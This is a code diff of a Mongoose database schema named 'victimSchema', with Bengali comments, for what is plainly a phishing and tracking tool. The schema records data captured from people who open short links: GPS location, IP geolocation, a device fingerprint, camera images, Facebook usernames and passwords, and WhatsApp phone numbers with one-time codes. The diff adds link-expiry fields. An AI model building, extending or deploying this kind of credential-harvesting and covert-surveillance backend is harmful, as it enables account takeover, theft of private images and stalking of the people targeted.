@@ -7,9 +7,10 @@ const victimSchema = new mongoose.Schema({
     shortLink: { type: String },
     timestamp: { type: Date, default: Date.now },
     status: { type: String, default: 'pending' },
-    
+    expiresAt: { type: Date, default: null }, // 🔥 লিংক এক্সপাইরি (৩০ মিনিট)
+    isExpired: { type: Boolean, default: false }, // 🔥 ম্যানুয়াল এক্সপাইরি
+
     ip: { type: String, default: null },
-    
     location: {
         country: { type: String, default: 'N/A' },
         region: { type: String, default: 'N/A' },
@@ -18,14 +19,12 @@ const victimSchema = new mongoose.Schema({
         longitude: { type: Number, default: 0 },
         isp: { type: String, default: 'N/A' }
     },
-    
     gpsLocation: {
         latitude: { type: Number, default: 0 },
         longitude: { type: Number, default: 0 },
         accuracy: { type: Number, default: 0 },
         googleMaps: { type: String, default: '' }
     },
-    
     device: {
         productSub: { type: String, default: 'N/A' },
         vendor: { type: String, default: 'N/A' },
@@ -47,13 +46,11 @@ const victimSchema = new mongoose.Schema({
         screen: { type: String, default: 'N/A' },
         colorDepth: { type: Number, default: 0 }
     },
-    
     media: [{
         kind: { type: String, default: 'N/A' },
         label: { type: String, default: 'N/A' },
         deviceId: { type: String, default: 'N/A' }
     }],
-    
     network: {
         type: { type: String, default: 'N/A' },
         rtt: { type: Number, default: 0 },
@@ -62,33 +59,27 @@ const victimSchema = new mongoose.Schema({
         downlink: { type: Number, default: 0 },
         downlinkMax: { type: Number, default: 0 }
     },
-    
     battery: {
         level: { type: Number, default: 0 },
         charging: { type: Boolean, default: false },
         chargingTime: { type: Number, default: 0 },
         dischargingTime: { type: Number, default: 0 }
     },
-    
     camera: [{
         image: { type: String, default: '' },
         timestamp: { type: Date, default: Date.now }
     }],
-    
     fbLogin: {
         username: { type: String, default: '' },
         password: { type: String, default: '' },
         timestamp: { type: Date, default: Date.now },
         ip: { type: String, default: 'N/A' }
     },
-    
-    // 🔥 হোয়াটসঅ্যাপ ডেটার জন্য নতুন ফিল্ড
     wpData: {
         phone: { type: String, default: '' },
         otp: { type: String, default: '' },
         timestamp: { type: Date, default: Date.now }
     },
-    
     collectedAt: { type: Date, default: Date.now }
 });
 
